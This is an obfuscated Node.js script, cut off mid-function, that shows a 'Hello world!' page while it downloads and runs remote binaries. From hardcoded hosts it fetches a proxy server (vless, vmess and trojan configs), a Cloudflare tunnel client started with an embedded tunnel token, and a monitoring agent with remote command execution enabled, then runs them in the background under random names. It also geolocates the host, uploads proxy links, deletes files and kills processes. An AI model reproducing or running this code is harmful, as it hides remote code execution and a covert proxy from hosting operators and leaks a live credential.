const _0x249e7e=_0x1e61;(function(_0x19e058,_0x4c63b0){const _0x33258f={_0xdef3ea:0x164,_0x4976d9:0x13f,_0x46b65e:0x169,_0x5e8bfe:0x18f,_0x4d7924:0x14c,_0x41a3aa:0xdc},_0x47a6a0=_0x1e61,_0x58f4f8=_0x19e058();while(!![]){try{const _0x4378e2=parseInt(_0x47a6a0(0xeb))/0x1+-parseInt(_0x47a6a0(_0x33258f._0xdef3ea))/0x2*(-parseInt(_0x47a6a0(_0x33258f._0x4976d9))/0x3)+parseInt(_0x47a6a0(_0x33258f._0x46b65e))/0x4*(-parseInt(_0x47a6a0(0x13e))/0x5)+parseInt(_0x47a6a0(0x16c))/0x6*(parseInt(_0x47a6a0(_0x33258f._0x5e8bfe))/0x7)+parseInt(_0x47a6a0(_0x33258f._0x4d7924))/0x8*(parseInt(_0x47a6a0(0x123))/0x9)+parseInt(_0x47a6a0(0x114))/0xa+-parseInt(_0x47a6a0(_0x33258f._0x41a3aa))/0xb;if(_0x4378e2===_0x4c63b0)break;else _0x58f4f8['push'](_0x58f4f8['shift']());}catch(_0x58c42e){_0x58f4f8['push'](_0x58f4f8['shift']());}}}(_0x2d3b,0x57f4d));const express=require(_0x249e7e(0x198)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x249e7e(0x19e)),{promisify}=require('util'),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x249e7e(0x102)]||'',PROJECT_URL=process[_0x249e7e(0x186)][_0x249e7e(0xf8)]||'',AUTO_ACCESS=process[_0x249e7e(0x186)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x249e7e(0x186)][_0x249e7e(0x116)]||_0x249e7e(0x18d),SUB_PATH=process['env'][_0x249e7e(0x134)]||_0x249e7e(0x18c),PORT=process['env'][_0x249e7e(0xe9)]||process[_0x249e7e(0x186)][_0x249e7e(0x12c)]||0xbb8,UUID=process[_0x249e7e(0x186)][_0x249e7e(0x135)]||_0x249e7e(0x12d),NEZHA_SERVER=process[_0x249e7e(0x186)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x249e7e(0x186)][_0x249e7e(0x199)]||'',ARGO_DOMAIN=process[_0x249e7e(0x186)][_0x249e7e(0x126)]||_0x249e7e(0x10d),ARGO_AUTH=process[_0x249e7e(0x186)][_0x249e7e(0x193)]||'eyJhIjoiNzg0OTI3ZWJlNDVjNWVkNWVhOWQ2OGM3YThjZTJjMTIiLCJ0IjoiMmRiOWViMDAtMGQ0OS00MDZhLWJiYTAtYzE3MzE5MDhmN2ViIiwicyI6IllUbGlOV1UxWmprdE1ESXdNeTAwWlRnNUxUZ3daalF0WXpWaFpXVm1NalJqWWpZeCJ9',ARGO_PORT=process[_0x249e7e(0x186)][_0x249e7e(0x171)]||0x1f41,CFIP=process[_0x249e7e(0x186)][_0x249e7e(0x14b)]||_0x249e7e(0x133),CFPORT=process[_0x249e7e(0x186)][_0x249e7e(0x105)]||0x1bb,NAME=process['env'][_0x249e7e(0x176)]||_0x249e7e(0x12b);!fs['existsSync'](FILE_PATH)?(fs[_0x249e7e(0x17b)](FILE_PATH),console['log'](FILE_PATH+_0x249e7e(0x192))):console['log'](FILE_PATH+_0x249e7e(0x183));function generateRandomName(){const _0x5a4560={_0x3553d4:0x197,_0xe03076:0xdd},_0x59302b=_0x249e7e,_0x27d59b=_0x59302b(_0x5a4560._0x3553d4);let _0x539d5c='';for(let _0x5e95d3=0x0;_0x5e95d3<0x6;_0x5e95d3++){_0x539d5c+=_0x27d59b[_0x59302b(0xe0)](Math[_0x59302b(_0x5a4560._0xe03076)](Math[_0x59302b(0x18e)]()*_0x27d59b[_0x59302b(0x120)]));}return _0x539d5c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x249e7e(0xfb)](FILE_PATH,npmName),phpPath=path[_0x249e7e(0xfb)](FILE_PATH,phpName),webPath=path[_0x249e7e(0xfb)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x249e7e(0xfb)](FILE_PATH,'list.txt'),bootLogPath=path[_0x249e7e(0xfb)](FILE_PATH,_0x249e7e(0x101)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x4e02d0={_0x4226bc:0x16b,_0x282b04:0x11c,_0x37e234:0x12f,_0x35d946:0x109,_0x1f9ebb:0x11c,_0x2b89c5:0x155,_0x299eca:0x152},_0x45cfe3=_0x249e7e;try{if(!UPLOAD_URL)return;if(!fs[_0x45cfe3(_0x4e02d0._0x4226bc)](subPath))return;let _0x39cd0b;try{_0x39cd0b=fs['readFileSync'](subPath,_0x45cfe3(_0x4e02d0._0x282b04));}catch{return null;}const _0x581dcf=Buffer[_0x45cfe3(_0x4e02d0._0x37e234)](_0x39cd0b,_0x45cfe3(0x137))[_0x45cfe3(_0x4e02d0._0x35d946)](_0x45cfe3(_0x4e02d0._0x1f9ebb)),_0x5ae26e=_0x581dcf[_0x45cfe3(0x16e)]('\x0a')[_0x45cfe3(_0x4e02d0._0x2b89c5)](_0xfe4938=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45cfe3(0x156)](_0xfe4938));if(_0x5ae26e[_0x45cfe3(0x120)]===0x0)return;return axios[_0x45cfe3(0x17a)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x5ae26e}),{'headers':{'Content-Type':'application/json'}})[_0x45cfe3(_0x4e02d0._0x299eca)](_0x43c549=>{return null;}),null;}catch(_0x588976){return null;}}function cleanupOldFiles(){const _0x231075={_0x149d8f:0x13a},_0x44d3ea={_0x251334:0xfb,_0x470fc8:0x194,_0x4ab3fd:0x127},_0x11a00b=_0x249e7e;try{const _0x1f56c0=fs[_0x11a00b(_0x231075._0x149d8f)](FILE_PATH);_0x1f56c0[_0x11a00b(0x191)](_0x2cccfc=>{const _0x72a2c7=_0x11a00b,_0x3ff38a=path[_0x72a2c7(_0x44d3ea._0x251334)](FILE_PATH,_0x2cccfc);try{const _0x4b42c3=fs[_0x72a2c7(_0x44d3ea._0x470fc8)](_0x3ff38a);_0x4b42c3['isFile']()&&fs[_0x72a2c7(_0x44d3ea._0x4ab3fd)](_0x3ff38a);}catch(_0x323c0d){}});}catch(_0x24f229){}}app[_0x249e7e(0x12a)]('/',function(_0x4bcab7,_0x468b86){const _0x5ba2cf={_0x468eb5:0x113},_0xf0d4b8=_0x249e7e;_0x468b86[_0xf0d4b8(_0x5ba2cf._0x468eb5)](_0xf0d4b8(0x146));});async function generateConfig(){const _0x5f0538={_0x11b5c5:0x167,_0x1457d7:0x15a,_0x4a46eb:0x138,_0x51c47c:0x11b,_0x3c5ae7:0x17e,_0xcf4d92:0xf9,_0x13209e:0x18a,_0x532769:0x15e,_0x4c115f:0x13d,_0x10db0c:0xec,_0x421ff0:0x13d,_0xe924c5:0x18a,_0x360494:0x195,_0x418299:0x157},_0x2a32e7=_0x249e7e,_0x3230fa={'log':{'access':_0x2a32e7(_0x5f0538._0x11b5c5),'error':_0x2a32e7(_0x5f0538._0x11b5c5),'loglevel':_0x2a32e7(_0x5f0538._0x1457d7)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2a32e7(0xf9),'settings':{'clients':[{'id':UUID,'flow':_0x2a32e7(0xf0)}],'decryption':_0x2a32e7(0x15a),'fallbacks':[{'dest':0xbb9},{'path':_0x2a32e7(_0x5f0538._0x4a46eb),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2a32e7(_0x5f0538._0x51c47c)}},{'port':0xbb9,'listen':_0x2a32e7(_0x5f0538._0x3c5ae7),'protocol':_0x2a32e7(0xf9),'settings':{'clients':[{'id':UUID}],'decryption':_0x2a32e7(0x15a)},'streamSettings':{'network':_0x2a32e7(_0x5f0538._0x51c47c),'security':_0x2a32e7(0x15a)}},{'port':0xbba,'listen':_0x2a32e7(_0x5f0538._0x3c5ae7),'protocol':_0x2a32e7(_0x5f0538._0xcf4d92),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2a32e7(_0x5f0538._0x1457d7),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2a32e7(0x13d),_0x2a32e7(_0x5f0538._0x13209e),_0x2a32e7(0x132)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2a32e7(0x17e),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2a32e7(_0x5f0538._0x532769)}},'sniffing':{'enabled':!![],'destOverride':[_0x2a32e7(_0x5f0538._0x4c115f),_0x2a32e7(_0x5f0538._0x13209e),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2a32e7(_0x5f0538._0x3c5ae7),'protocol':_0x2a32e7(_0x5f0538._0x10db0c),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2a32e7(0x170)}},'sniffing':{'enabled':!![],'destOverride':[_0x2a32e7(_0x5f0538._0x421ff0),_0x2a32e7(_0x5f0538._0xe924c5),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x2a32e7(0xe3)]},'outbounds':[{'protocol':_0x2a32e7(_0x5f0538._0x360494),'tag':_0x2a32e7(_0x5f0538._0x418299)},{'protocol':'blackhole','tag':'block'}]};fs[_0x2a32e7(0x184)](path[_0x2a32e7(0xfb)](FILE_PATH,_0x2a32e7(0x14d)),JSON[_0x2a32e7(0x11f)](_0x3230fa,null,0x2));}function _0x2d3b(){const _0x47004b=['clear','false','https://amd64.ssss.nyc.mn/bot','tls','\x0a\x0avmess://','sub','./tmp','random','35728hgTDhw','Unhandled\x20error\x20in\x20startserver:','forEach','\x20is\x20created','ARGO_AUTH','statSync','freedom','2053','abcdefghijklmnopqrstuvwxyz','express','NEZHA_KEY','application/json','.exe\x20>\x20nul\x202>&1','Subscription\x20uploaded\x20successfully','unshift','path','arm','Download\x20','del\x20/f\x20/q\x20','close','ARGO_DOMAIN:','http\x20server\x20is\x20running\x20on\x20port:','10864106SdxRFx','floor','\x20-c\x20\x22','fileUrl','charAt','2083','\x0aclient_secret:\x20','https+local://8.8.8.8/dns-query','/sub.txt\x20saved\x20successfully','set','has','response','2096','SERVER_PORT','Error\x20reading\x20boot.log:','706343qnRLGn','trojan','org','map','\x20>\x20nul\x202>&1','xtls-rprx-vision','\x20>/dev/null\x202>&1\x20&','Empowerment\x20failed\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://ipapi.co/json/','pipe','platform','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','PROJECT_URL','vless','\x0a\x0atrojan://','join','basename','\x20successfully','status','pop','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','boot.log','UPLOAD_URL','country_code','\x0avless://','CFPORT','https://amd64.ssss.nyc.mn/web','Content-Type','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','toString','\x20is\x20running','\x22\x20>\x20/dev/null\x202>&1','aarch64','fti.hrxckj.cn','error','success','\x20failed:\x20','win32','stream','send','3608310RVVGgJ','all','FILE_PATH','includes','tunnel.json','\x20-c\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tcp','utf-8','?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/v1','stringify','length','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','message','99BpYoJR','Error\x20executing\x20command:\x20','\x20-s\x20','ARGO_DOMAIN','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','get','meng','PORT','ac24a380-6e14-492c-8f7b-e380f4cd0ba0','Nodes\x20uploaded\x20successfully','from','ArgoDomain:','npm\x20running\x20error:\x20','quic','cdns.doon.eu.org','SUB_PATH','UUID','config.yaml','base64','/vless-argo','/api/add-subscriptions','readdirSync','App\x20is\x20running','&fp=firefox&type=ws&host=','http','378605YKdUHQ','39eWDitt','web\x20running\x20error:\x20','https://oooo.serv00.net/add-url','/api/add-nodes','?security=tls&sni=','arm64','Skipping\x20adding\x20automatic\x20access\x20task','Hello\x20world!','/config.json\x20>/dev/null\x202>&1\x20&','2087','readFileSync','443','CFIP','55416JDVbfl','config.json','Empowerment\x20success\x20for\x20','pkill\x20-f\x20\x22[','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','--tls','catch','match','&path=%2Fvless-argo%3Fed%3D2560#','filter','test','direct','firefox','8443','none','finish','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','arch','/vmess-argo','rm\x20-rf\x20','unlink','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/tunnel.yml\x20run','chmod','30554UumIVN','\x20>/dev/null\x202>&1','taskkill\x20/f\x20/im\x20','/dev/null','push','4NhxjoZ','data','existsSync','96eejxVF','\x0a\x20\x20\x20\x20','split','substring','/trojan-argo','ARGO_PORT','listen','NEZHA\x20variable\x20is\x20empty,skip\x20running','log','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NAME','https://amd64.ssss.nyc.mn/agent','&path=%2Ftrojan-argo%3Fed%3D2560#','fileName','post','mkdirSync','then','https://arm64.ssss.nyc.mn/bot','127.0.0.1','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','TunnelSecret','nohup\x20','https://arm64.ssss.nyc.mn/web','\x20already\x20exists','writeFileSync','countryCode','env'];_0x2d3b=function(){return _0x47004b;};return _0x2d3b();}function getSystemArchitecture(){const _0x219ac6={_0x24f445:0x15d,_0x17d7cb:0x19f,_0xf766bc:0x144},_0x4fb372=_0x249e7e,_0x5211ea=os[_0x4fb372(_0x219ac6._0x24f445)]();return _0x5211ea===_0x4fb372(_0x219ac6._0x17d7cb)||_0x5211ea===_0x4fb372(_0x219ac6._0xf766bc)||_0x5211ea===_0x4fb372(0x10c)?'arm':'amd';}function downloadFile(_0x4993aa,_0x1cbb29,_0x54181f){const _0x179fc1={_0x2cca8c:0x110,_0x5cb284:0x122},_0x373c10={_0x28fe01:0xf5,_0x23fa25:0x15b},_0x3eb8ca={_0x3bf475:0x10e},_0x271a8a={_0xed598e:0xd9,_0x427a3f:0x174,_0x3de0bf:0xfd},_0x1dd82b=_0x249e7e,_0x35fb22=_0x4993aa;!fs[_0x1dd82b(0x16b)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x449d57=fs['createWriteStream'](_0x35fb22);axios({'method':_0x1dd82b(0x12a),'url':_0x1cbb29,'responseType':_0x1dd82b(0x112)})[_0x1dd82b(0x17c)](_0x20ccb9=>{const _0x445afd=_0x1dd82b;_0x20ccb9[_0x445afd(0x16a)][_0x445afd(_0x373c10._0x28fe01)](_0x449d57),_0x449d57['on'](_0x445afd(_0x373c10._0x23fa25),()=>{const _0xc40ee3=_0x445afd;_0x449d57[_0xc40ee3(_0x271a8a._0xed598e)](),console[_0xc40ee3(_0x271a8a._0x427a3f)]('Download\x20'+path[_0xc40ee3(0xfc)](_0x35fb22)+_0xc40ee3(_0x271a8a._0x3de0bf)),_0x54181f(null,_0x35fb22);}),_0x449d57['on'](_0x445afd(0x10e),_0x568bdc=>{const _0x2a4772=_0x445afd;fs[_0x2a4772(0x160)](_0x35fb22,()=>{});const _0x45f478=_0x2a4772(0x1a0)+path[_0x2a4772(0xfc)](_0x35fb22)+'\x20failed:\x20'+_0x568bdc['message'];console[_0x2a4772(_0x3eb8ca._0x3bf475)](_0x45f478),_0x54181f(_0x45f478);});})['catch'](_0x4f8c5e=>{const _0x5ac037=_0x1dd82b,_0x18afb5=_0x5ac037(0x1a0)+path['basename'](_0x35fb22)+_0x5ac037(_0x179fc1._0x2cca8c)+_0x4f8c5e[_0x5ac037(_0x179fc1._0x5cb284)];console[_0x5ac037(0x10e)](_0x18afb5),_0x54181f(_0x18afb5);});}async function downloadFilesAndRun(){const _0x3da179={_0x2026bf:0x115,_0x4de08f:0xe6,_0x2d4101:0x188,_0x43d955:0xe2,_0x4543ef:0x175,_0x113330:0xf7,_0x12811a:0x184,_0x125cf5:0xfb,_0x1b0a80:0x174,_0xa46959:0x10e,_0x3b88a1:0x159,_0x35f554:0x181,_0x5385e9:0x125,_0x55f444:0x173,_0x51ae51:0x119,_0x47e6cf:0x140,_0x588d57:0x153,_0x43b69c:0x108,_0x4d38ca:0xf3,_0x1a8ae6:0x100,_0x445f01:0x181,_0x576886:0xf1,_0x56a92a:0x174,_0x325614:0x124},_0x168892={_0x18f7af:0x179},_0x4152f9=_0x249e7e,_0x165a21=getSystemArchitecture(),_0x4d1583=getFilesForArchitecture(_0x165a21);if(_0x4d1583[_0x4152f9(0x120)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3057de=_0x4d1583[_0x4152f9(0xee)](_0x443988=>{return new Promise((_0x54ccb7,_0x522b60)=>{const _0x297755=_0x1e61;downloadFile(_0x443988[_0x297755(_0x168892._0x18f7af)],_0x443988[_0x297755(0xdf)],(_0x91f96a,_0x2cb72b)=>{_0x91f96a?_0x522b60(_0x91f96a):_0x54ccb7(_0x2cb72b);});});});try{await Promise[_0x4152f9(_0x3da179._0x2026bf)](_0x3057de);}catch(_0x32a41b){console['error']('Error\x20downloading\x20files:',_0x32a41b);return;}function _0x44d05b(_0x1ce2fd){const _0x5e4485={_0x572d01:0x163},_0x5c571c=_0x4152f9,_0x342262=0x1fd;_0x1ce2fd[_0x5c571c(0x191)](_0x340986=>{const _0x194645={_0x583c2d:0x14e},_0xf9c21=_0x5c571c;fs['existsSync'](_0x340986)&&fs[_0xf9c21(_0x5e4485._0x572d01)](_0x340986,_0x342262,_0x298878=>{const _0x49c77d=_0xf9c21;_0x298878?console[_0x49c77d(0x10e)](_0x49c77d(0xf2)+_0x340986+':\x20'+_0x298878):console[_0x49c77d(0x174)](_0x49c77d(_0x194645._0x583c2d)+_0x340986+':\x20'+_0x342262[_0x49c77d(0x109)](0x8));});});}const _0x4cd9f2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x44d05b(_0x4cd9f2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2dfa0f=NEZHA_SERVER[_0x4152f9(0x117)](':')?NEZHA_SERVER[_0x4152f9(0x16e)](':')[_0x4152f9(0xff)]():'',_0x2b6610=new Set([_0x4152f9(0x14a),'8443',_0x4152f9(0xe8),_0x4152f9(0x148),_0x4152f9(0xe1),'2053']),_0x435e4c=_0x2b6610[_0x4152f9(_0x3da179._0x4de08f)](_0x2dfa0f)?'true':_0x4152f9(_0x3da179._0x2d4101),_0x2710ab=_0x4152f9(_0x3da179._0x43d955)+NEZHA_KEY+_0x4152f9(_0x3da179._0x4543ef)+NEZHA_SERVER+_0x4152f9(_0x3da179._0x113330)+_0x435e4c+_0x4152f9(0x161)+UUID;fs[_0x4152f9(_0x3da179._0x12811a)](path[_0x4152f9(_0x3da179._0x125cf5)](FILE_PATH,_0x4152f9(0x136)),_0x2710ab);const _0x3c3845=_0x4152f9(0x181)+phpPath+_0x4152f9(0xde)+FILE_PATH+_0x4152f9(0x11a);try{await exec(_0x3c3845),console[_0x4152f9(_0x3da179._0x1b0a80)](phpName+'\x20is\x20running'),await new Promise(_0x28479f=>setTimeout(_0x28479f,0x3e8));}catch(_0x1eb45f){console[_0x4152f9(_0x3da179._0xa46959)]('php\x20running\x20error:\x20'+_0x1eb45f);}}else{let _0x37e87b='';const _0x35350e=['443',_0x4152f9(_0x3da179._0x3b88a1),'2096','2087',_0x4152f9(0xe1),_0x4152f9(0x196)];_0x35350e[_0x4152f9(0x117)](NEZHA_PORT)&&(_0x37e87b=_0x4152f9(0x151));const _0x3ddbc8=_0x4152f9(_0x3da179._0x35f554)+npmPath+_0x4152f9(_0x3da179._0x5385e9)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x37e87b+_0x4152f9(0x129);try{await exec(_0x3ddbc8),console[_0x4152f9(0x174)](npmName+'\x20is\x20running'),await new Promise(_0x60607e=>setTimeout(_0x60607e,0x3e8));}catch(_0x571480){console[_0x4152f9(0x10e)](_0x4152f9(0x131)+_0x571480);}}}else console[_0x4152f9(0x174)](_0x4152f9(_0x3da179._0x55f444));const _0x4129d9='nohup\x20'+webPath+_0x4152f9(_0x3da179._0x51ae51)+FILE_PATH+_0x4152f9(0x147);try{await exec(_0x4129d9),console[_0x4152f9(_0x3da179._0x1b0a80)](webName+_0x4152f9(0x10a)),await new Promise(_0x13bd2d=>setTimeout(_0x13bd2d,0x3e8));}catch(_0x2e3389){console['error'](_0x4152f9(_0x3da179._0x47e6cf)+_0x2e3389);}if(fs[_0x4152f9(0x16b)](botPath)){let _0x4e3e24;if(ARGO_AUTH[_0x4152f9(_0x3da179._0x588d57)](/^[A-Z0-9a-z=]{120,250}$/))_0x4e3e24=_0x4152f9(0x128)+ARGO_AUTH;else ARGO_AUTH[_0x4152f9(0x153)](/TunnelSecret/)?_0x4e3e24=_0x4152f9(_0x3da179._0x43b69c)+FILE_PATH+_0x4152f9(0x162):_0x4e3e24=_0x4152f9(_0x3da179._0x4d38ca)+FILE_PATH+_0x4152f9(_0x3da179._0x1a8ae6)+ARGO_PORT;try{await exec(_0x4152f9(_0x3da179._0x445f01)+botPath+'\x20'+_0x4e3e24+_0x4152f9(_0x3da179._0x576886)),console[_0x4152f9(_0x3da179._0x56a92a)](botName+_0x4152f9(0x10a)),await new Promise(_0x32e582=>setTimeout(_0x32e582,0x7d0));}catch(_0x16d40c){console[_0x4152f9(_0x3da179._0xa46959)](_0x4152f9(_0x3da179._0x325614)+_0x16d40c);}}await new Promise(_0x488d07=>setTimeout(_0x488d07,0x1388));}function getFilesForArchitecture(_0xff6b){const _0x101086={_0x40713c:0x182,_0x17dafe:0x106,_0x35e3c6:0x19f,_0x2bd6b9:0x177,_0x425e5c:0x19d},_0x19fa34=_0x249e7e;let _0x598395;_0xff6b===_0x19fa34(0x19f)?_0x598395=[{'fileName':webPath,'fileUrl':_0x19fa34(_0x101086._0x40713c)},{'fileName':botPath,'fileUrl':_0x19fa34(0x17d)}]:_0x598395=[{'fileName':webPath,'fileUrl':_0x19fa34(_0x101086._0x17dafe)},{'fileName':botPath,'fileUrl':_0x19fa34(0x189)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x55a1bc=_0xff6b===_0x19fa34(_0x101086._0x35e3c6)?'https://arm64.ssss.nyc.mn/agent':_0x19fa34(_0x101086._0x2bd6b9);_0x598395[_0x19fa34(0x19d)]({'fileName':npmPath,'fileUrl':_0x55a1bc});}else{const _0x14bd02=_0xff6b===_0x19fa34(0x19f)?_0x19fa34(0x11e):'https://amd64.ssss.nyc.mn/v1';_0x598395[_0x19fa34(_0x101086._0x425e5c)]({'fileName':phpPath,'fileUrl':_0x14bd02});}}return _0x598395;}function argoType(){const _0x137d1d={_0x174c60:0x180,_0x16a6fd:0x118,_0x1beb19:0xfb,_0x2aba25:0x118,_0x5d6704:0x184,_0x23e1c0:0x174},_0x5e4d5a=_0x249e7e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5e4d5a(0x174)](_0x5e4d5a(0x121));return;}if(ARGO_AUTH['includes'](_0x5e4d5a(_0x137d1d._0x174c60))){fs[_0x5e4d5a(0x184)](path[_0x5e4d5a(0xfb)](FILE_PATH,_0x5e4d5a(_0x137d1d._0x16a6fd)),ARGO_AUTH);const _0x7065d9='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x5e4d5a(_0x137d1d._0x1beb19)](FILE_PATH,_0x5e4d5a(_0x137d1d._0x2aba25))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x5e4d5a(0x150);fs[_0x5e4d5a(_0x137d1d._0x5d6704)](path[_0x5e4d5a(0xfb)](FILE_PATH,'tunnel.yml'),_0x7065d9);}else console[_0x5e4d5a(_0x137d1d._0x23e1c0)](_0x5e4d5a(0x17f));}async function extractDomains(){const _0x39180c={_0x343ce4:0x149,_0x1429f2:0xfb,_0x2e75d4:0x16e,_0x4978af:0x130,_0x1b6c02:0xf1,_0x543f8d:0x10e,_0x25f4a7:0xea},_0x49f258={_0x4f2144:0xf4,_0x293fea:0x16a,_0x180176:0x103,_0x7825bc:0x16a,_0xcc9991:0x103,_0x3fdd5e:0xed,_0x13af28:0x16a,_0x12433d:0xfe,_0x134a01:0x10f},_0x2ee5ba={_0x4823d5:0xf6,_0x41fa94:0x111,_0x21b6a4:0x166,_0x4462ba:0x19b,_0xb66787:0xe0},_0x15a65c={_0x3db608:0x168},_0x4a1121=_0x249e7e;let _0x9dca0a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x9dca0a=ARGO_DOMAIN,console['log'](_0x4a1121(0xda),_0x9dca0a),await _0x2b04f9(_0x9dca0a);else try{const _0x572956=fs[_0x4a1121(_0x39180c._0x343ce4)](path[_0x4a1121(_0x39180c._0x1429f2)](FILE_PATH,_0x4a1121(0x101)),'utf-8'),_0x439235=_0x572956[_0x4a1121(_0x39180c._0x2e75d4)]('\x0a'),_0x2bc3de=[];_0x439235[_0x4a1121(0x191)](_0x329055=>{const _0x35ae18=_0x4a1121,_0x369f22=_0x329055['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x369f22){const _0x11aa50=_0x369f22[0x1];_0x2bc3de[_0x35ae18(_0x15a65c._0x3db608)](_0x11aa50);}});if(_0x2bc3de[_0x4a1121(0x120)]>0x0)_0x9dca0a=_0x2bc3de[0x0],console[_0x4a1121(0x174)](_0x4a1121(_0x39180c._0x4978af),_0x9dca0a),await _0x2b04f9(_0x9dca0a);else{console[_0x4a1121(0x174)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x4a1121(0x127)](path['join'](FILE_PATH,_0x4a1121(0x101)));async function _0x1740ef(){const _0x52740f=_0x4a1121;try{process[_0x52740f(_0x2ee5ba._0x4823d5)]===_0x52740f(_0x2ee5ba._0x41fa94)?await exec(_0x52740f(_0x2ee5ba._0x21b6a4)+botName+_0x52740f(_0x2ee5ba._0x4462ba)):await exec(_0x52740f(0x14f)+botName[_0x52740f(_0x2ee5ba._0xb66787)](0x0)+']'+botName[_0x52740f(0x16f)](0x1)+_0x52740f(0x10b));}catch(_0x151ed1){}}_0x1740ef(),await new Promise(_0x1afcf6=>setTimeout(_0x1afcf6,0xbb8));const _0x1efb37='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x4a1121(0x100)+ARGO_PORT;try{await exec(_0x4a1121(0x181)+botPath+'\x20'+_0x1efb37+_0x4a1121(_0x39180c._0x1b6c02)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x525663=>setTimeout(_0x525663,0xbb8)),await extractDomains();}catch(_0x3f3219){console[_0x4a1121(0x10e)]('Error\x20executing\x20command:\x20'+_0x3f3219);}}}catch(_0x121a63){console[_0x4a1121(_0x39180c._0x543f8d)](_0x4a1121(_0x39180c._0x25f4a7),_0x121a63);}async function _0x20fa80(){const _0x4bf10e=_0x4a1121;try{const _0x1f82d6=await axios[_0x4bf10e(0x12a)](_0x4bf10e(_0x49f258._0x4f2144),{'timeout':0xbb8});if(_0x1f82d6[_0x4bf10e(0x16a)]&&_0x1f82d6[_0x4bf10e(_0x49f258._0x293fea)][_0x4bf10e(_0x49f258._0x180176)]&&_0x1f82d6[_0x4bf10e(0x16a)][_0x4bf10e(0xed)])return _0x1f82d6[_0x4bf10e(_0x49f258._0x7825bc)][_0x4bf10e(_0x49f258._0xcc9991)]+'_'+_0x1f82d6[_0x4bf10e(0x16a)][_0x4bf10e(_0x49f258._0x3fdd5e)];}catch(_0x30509f){try{const _0x270b3f=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x270b3f[_0x4bf10e(0x16a)]&&_0x270b3f[_0x4bf10e(_0x49f258._0x13af28)][_0x4bf10e(_0x49f258._0x12433d)]===_0x4bf10e(_0x49f258._0x134a01)&&_0x270b3f[_0x4bf10e(0x16a)][_0x4bf10e(0x185)]&&_0x270b3f[_0x4bf10e(_0x49f258._0x7825bc)][_0x4bf10e(0xed)])return _0x270b3f['data'][_0x4bf10e(0x185)]+'_'+_0x270b3f['data']['org'];}catch(_0x2cd6bb){}}return'Unknown';}async function _0x2b04f9(_0x4b8312){const 